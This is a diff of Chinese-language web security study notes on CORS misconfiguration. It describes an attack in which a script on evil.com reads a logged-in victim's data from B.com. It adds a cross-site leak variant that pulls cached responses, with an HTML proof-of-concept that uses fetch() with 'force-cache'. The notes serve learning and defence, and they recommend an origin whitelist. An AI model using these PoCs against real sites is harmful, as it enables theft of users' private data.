@@ -275,11 +275,11 @@ Content-Type: application/xml
 ----
 
 * 使用CORS实现跨域 常见的**安全风险**
-  * B.com的`Access-Control-Allow-Origin: *`可以接收并响应来自任何域的request 存在**巨大风险**. 应该设置"源域名白名单"
-* CORS attack
-  * 步骤(1) 攻击者在evil.com(被目标站CORS信任的域都行) 用脚本(JavaScript)实现 "发起跨域request的代码" 参考PoC1 PoC2 PoC3
-  * 步骤(2) 正常用户 登录B.com
-  * 步骤(3) 正常用户 访问evil.com (因为B.com后端的CORS未正确配置)所以从evil.com向B.com发出跨域请求, 得到了B.com的响应, evil获取到了B.com的数据.
+  * "CORS错误配置漏洞"(CORS misconfiguration)
+    * `B.com`的Response Header有`Access-Control-Allow-Origin: *`则存在漏洞, 即`B.com`可以接收并响应来自任何域的request, 存在"跨站信息泄露"(cross-site leak)等**风险**. 应该设置"源域名白名单".
+* attack
+  * 步骤(1) 攻击者在`evil.com`(被目标站CORS信任的域都行) 用脚本(JavaScript)实现 "发起跨域request的代码" 参考PoC1 PoC2 PoC3
+  * 步骤(2) 正常用户 登录过`B.com` 并访问`evil.com` (因为B.com后端的CORS未正确配置) 所以从`evil.com`向`B.com`发出一个跨域请求, 得到了`B.com`的Response, `evil.com`获取到了`B.com`的数据.
 * 用脚本(JavaScript)发送request的方法: 它们遵循SOP CORS 即符合CORS策略时能够发送跨域request
   * [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)
   * [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) more powerful!
@@ -328,24 +328,27 @@ function cors() {
 ```
 
 PoC3: poc3_cors_FetchAPI.html
+
+* "跨站信息泄露"(cross-site leak). 当满足以下2个条件时, 通过"读取硬盘缓存的Response"可获取到之前的Response(更可能有敏感数据)! 参考#761726
+  * 条件1. 目标站存在CORS漏洞.
+  * 条件2. 目标站允许缓存.  即Response Header的`Cache-Control`header不存在, 或者这个header存在并说明了"允许缓存".
 ```html
 <html>
 <script>
-var url1 = "https://A.com/x.json";  
+var url1 = "https://B.com/x.json"; // B.com has the CORS misconfiguration.
 
 obj1 = {    
     method: 'GET',    
     cache: 'force-cache' //强制读取硬盘中的缓存 (from disk cache). 实测不会真正发出request.
     }
 
-
 fetch(url1,obj1)
   .then(function(response) { //Response
-  	// return response.text(); // Promise
+    // return response.text(); // Promise
     return response.json(); // Promise
   })
-  .then(function(myJson) {
-    console.log(myJson);
+  .then(function(Json1) {
+    console.log(Json1); //output
   });
 
 </script>
